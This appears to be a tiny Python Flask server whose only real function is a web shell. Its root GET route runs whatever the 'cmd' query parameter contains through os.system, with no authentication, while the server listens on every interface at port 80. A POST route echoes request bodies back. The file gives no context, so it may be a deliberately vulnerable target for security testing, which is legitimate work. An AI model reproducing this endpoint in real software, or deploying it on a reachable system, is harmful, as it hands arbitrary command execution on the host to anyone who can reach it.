import os
from flask import Flask, request
from werkzeug.serving import WSGIRequestHandler

app = Flask(__name__)


@app.route('/')
def run_cmd():
    if 'cmd' in request.args:
        os.system(request.args['cmd'])
    return 'OK'


@app.route('/', methods=['POST'])
def echo_request():
    return request.get_data()


if __name__ == '__main__':
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(host='0.0.0.0', port=80, threaded=True, debug=False)
